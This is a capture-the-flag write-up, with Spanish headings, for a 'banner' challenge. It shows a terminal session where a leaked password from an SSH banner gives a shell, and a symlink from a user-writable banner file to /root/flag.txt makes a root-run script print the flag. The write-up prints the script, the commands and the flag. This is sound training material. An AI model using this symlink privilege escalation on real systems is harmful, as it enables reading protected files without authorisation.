## Descripción
Can you abuse the banner? The server has been leaking some crucial information on `xebec.cylabacademy.net 39400`. Use the leaked information to get to the server.

To connect to the running application use `nc xebec.cylabacademy.net 31014`. From the above information abuse the machine and find the flag in the /root directory.

1.- Do you know about symlinks?

2.- Maybe some small password cracking or guessing

## Solución
```
paco1234@ubuntu-paco:~$ nc xebec.cylabacademy.net 39400
SSH-2.0-OpenSSH_9.6p1 My_Passw@rd_@1234
^C
                                                                                                                                                                                                                                           
paco1234@ubuntu-paco:~$ nc xebec.cylabacademy.net 31014
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234       
What is the top cyber security conference in the world?
DEFCON
the first hacker ever was known for phreaking(making free phone calls), who was it?
JOHN DRAPER
player@challenge:~$ ls
ls
banner  text
player@challenge:~$ cat text
cat text
keep digging
player@challenge:~$ cd/
cd/
-bash: cd/: No such file or directory
player@challenge:~$ cd/root
cd/root
-bash: cd/root: No such file or directory
player@challenge:~$ cd /root
cd /root
player@challenge:/root$ ls
ls
flag.txt  script.py
player@challenge:/root$ cat flag.txt
cat flag.txt
cat: flag.txt: Permission denied
player@challenge:/root$ cat script.py
cat script.py

import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt

player@challenge:/root$ cd /home/player
cd /home/player
player@challenge:~$ ls -l
ls -l
total 8
-rw-r--r-- 1 player player 114 Sep 23 00:59 banner
-rw-r--r-- 1 root   root    13 Sep 23 00:59 text
player@challenge:~$ rm banner
rm banner
player@challenge:~$ ln -s /root/flag.txt banner
ln -s /root/flag.txt banner
player@challenge:~$ ls -l banner
ls -l banner
lrwxrwxrwx 1 player player 14 Sep 30 01:43 banner -> /root/flag.txt
player@challenge:~$ ^C
                                                                                                                                                                                                                                           
paco1234@ubuntu-paco:~$ nc xebec.cylabacademy.net 31014
academy{b4nn3r_gr4bb1n9_su((3sfu11y_d3ce8df1}



academy{b4nn3r_gr4bb1n9_su((3sfu11y_d3ce8df1}
```

## Notas Adicionales

## Referencias
- Ubuntu (entorno local adaptado)
